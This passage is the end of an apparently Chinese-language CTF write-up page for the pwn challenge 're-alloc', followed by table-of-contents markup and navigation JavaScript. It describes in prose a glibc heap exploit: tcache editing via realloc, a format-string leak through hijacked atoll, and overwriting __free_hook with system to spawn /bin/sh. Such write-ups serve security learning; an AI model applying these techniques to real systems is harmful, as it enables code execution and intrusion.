+一時間找不到方法繞過這個檢查機制。除此之外，off-by-one null byte 的漏洞也因為產生的 chunk size 大小只到 <code>0x80</code> 而難以利用（畢竟蓋掉之後 size 就會變成 0）。</p><p>我心中一直把 <code>realloc</code> 當成一次 <code>free</code> 跟一次 <code>malloc</code>，後來突然想到：如果 <code>realloc</code> 指定的 size 原本的 chunk 就夠大，它應該會想要給你原本那塊吧。確認一下這個版本 libc 的確是這樣實作的（當然，如果新 size 縮小夠多，也會把剩餘的空間切出來當作被 <code>free</code>），所以我只要 <code>realloc</code> 跟原本一樣的 size，就相當於有了修改 note 的功能。而且這可以針對已經被 free 進 tcache 的 chunk 修改，差不多就是達到 arbitrary write 了！</p><p>然而，縱使有了修改功能，我們仍然會遇到 pointer 不夠用的問題：<code>heap[0]</code> hold 一塊被塞進 tcache 的 chunk 並修改上面的值之後，還要再兩次 malloc 才會拿到位置被指定的那個 chunk。比賽中，我的 code 因為不斷的修改，留下了一段歷史遺跡，很幸運的發現他幫我解決了這個問題，它現在在 exploit 裡長這樣：</p><pre><code class="python hljs">rfree(<span class="hljs-number">1</span>)  <span class="hljs-comment"># I don't know why, but this line seems do the magic</span>
+</code></pre><p>我在比賽後研究了一下這行到底有什麼魔力：<br>
+我們知道，<code>realloc</code> 若指定新 size 為 <code>0</code> 會相當於 <code>free</code>、若指定原 pointer 為 <code>NULL</code> 會相當於 <code>malloc</code>，那麼若是 <code>realloc(NULL, 0)</code> 會怎樣呢？答案是相當於 <code>malloc</code>（讀完 code 之後，發現連 manual 裡也是這樣描述的）。而 <code>malloc(0)</code> 會如何呢？根據這個 libc 的實作，會回一個最小合法 size 的 chunk（這點 manual 的描述則是可能 return 一個合法的 malloc 結果也可能 return NULL）。而我當時很幸運的正在使用最小 size 的 chunk，所以這個 free 操作就幫我拿掉一個 chunk 並且不佔用 pointer。（順帶一提，後面第二次 arbitrary write 時我也曾考慮用同樣這行，但沒有成功，理由就是因為當時使用的 chunk size 不一樣了）</p><p>有了第一次 arbitrary write 後，照著剛剛的美好規劃把 <code>atoll</code> hijack 成 <code>printf@plt</code>，然後利用 format string attack，可以 leak libc 以及把 heap pointer 清成 NULL（因為長度只有 16，要達到 arbitrary write 有點困難，但可以把任意位置改成 <code>0</code>；順帶一提，當時沒想太多就實作了逐 byte 改成 <code>0</code> 的作法，之後才發現這步驟有點多餘，可以用 <code>%9$ln</code> 這種 format string 一次改全部）。這樣就不會用 pointer 不夠用的問題，於是就再一次 arbitrary write 把 freehook 改成 system，然後 free 一塊寫有 <code>/bin/sh</code> 的 chunk 來 get shell！</p><h5 id="分工：林廷衛"><a class="anchor hidden-xs" href="#分工：林廷衛" title="分工：林廷衛"><span class="octicon octicon-link"></span></a>分工：林廷衛</h5><p>Flag: <code>FLAG{Heeeeeeeeeeeeeeeeeeeeeee4p}</code></p></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav">
+<li class=""><a href="#Final-CTF-write-up" title="Final CTF write up">Final CTF write up</a><ul class="nav">
+<li><a href="#Misc" title="Misc">Misc</a><ul class="nav">
+<li><a href="#Ponzi-scheme" title="Ponzi scheme">Ponzi scheme</a></li>
+<li><a href="#Welcome" title="Welcome">Welcome</a></li>
+</ul>
+</li>
+<li><a href="#Reverse" title="Reverse">Reverse</a><ul class="nav">
+<li><a href="#H0W" title="H0W">H0W</a></li>
+<li><a href="#PokemonGo" title="PokemonGo">PokemonGo</a></li>
+<li><a href="#YugiMuto" title="YugiMuto">YugiMuto</a></li>
+</ul>
+</li>
+<li><a href="#Crypto" title="Crypto">Crypto</a><ul class="nav">
+<li><a href="#RSACTR" title="RSACTR">RSACTR</a></li>
+<li><a href="#train" title="train">train</a></li>
+<li><a href="#winner-winner-chicken-dinner" title="winner winner chicken dinner">winner winner chicken dinner</a></li>
+</ul>
+</li>
+<li><a href="#Web" title="Web">Web</a><ul class="nav">
+<li><a href="#babyRMI" title="babyRMI">babyRMI</a></li>
+<li><a href="#how2meow" title="how2meow">how2meow</a></li>
+<li><a href="#King-of-PHP" title="King of PHP">King of PHP</a></li>
+<li><a href="#echo" title="echo">echo</a></li>
+</ul>
+</li>
+<li><a href="#Pwn" title="Pwn">Pwn</a><ul class="nav">
+<li><a href="#Impossible" title="Impossible">Impossible</a></li>
+<li><a href="#nonono" title="nonono">nonono</a></li>
+<li><a href="#re-alloc" title="re-alloc">re-alloc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+            </ul>
+        </div>
+    </div>
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;" null null>
+        <div class="toc"><ul class="nav">
+<li class=""><a href="#Final-CTF-write-up" title="Final CTF write up">Final CTF write up</a><ul class="nav">
+<li><a href="#Misc" title="Misc">Misc</a><ul class="nav">
+<li><a href="#Ponzi-scheme" title="Ponzi scheme">Ponzi scheme</a></li>
+<li><a href="#Welcome" title="Welcome">Welcome</a></li>
+</ul>
+</li>
+<li><a href="#Reverse" title="Reverse">Reverse</a><ul class="nav">
+<li><a href="#H0W" title="H0W">H0W</a></li>
+<li><a href="#PokemonGo" title="PokemonGo">PokemonGo</a></li>
+<li><a href="#YugiMuto" title="YugiMuto">YugiMuto</a></li>
+</ul>
+</li>
+<li><a href="#Crypto" title="Crypto">Crypto</a><ul class="nav">
+<li><a href="#RSACTR" title="RSACTR">RSACTR</a></li>
+<li><a href="#train" title="train">train</a></li>
+<li><a href="#winner-winner-chicken-dinner" title="winner winner chicken dinner">winner winner chicken dinner</a></li>
+</ul>
+</li>
+<li><a href="#Web" title="Web">Web</a><ul class="nav">
+<li><a href="#babyRMI" title="babyRMI">babyRMI</a></li>
+<li><a href="#how2meow" title="how2meow">how2meow</a></li>
+<li><a href="#King-of-PHP" title="King of PHP">King of PHP</a></li>
+<li><a href="#echo" title="echo">echo</a></li>
+</ul>
+</li>
+<li><a href="#Pwn" title="Pwn">Pwn</a><ul class="nav">
+<li><a href="#Impossible" title="Impossible">Impossible</a></li>
+<li><a href="#nonono" title="nonono">nonono</a></li>
+<li><a href="#re-alloc" title="re-alloc">re-alloc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        var toggle = $('.expand-toggle');
+        var tocExpand = false;
+
+        checkExpandToggle();
+        toggle.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            tocExpand = !tocExpand;
+            checkExpandToggle();
+        })
+
+        function checkExpandToggle () {
+            var toc = $('.ui-toc-dropdown .toc');
+            var toggle = $('.expand-toggle');
+            if (!tocExpand) {
+                toc.removeClass('expand');
+                toggle.text('Expand all');
+            } else {
+                toc.addClass('expand');
+                toggle.text('Collapse all');
+            }
+        }
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
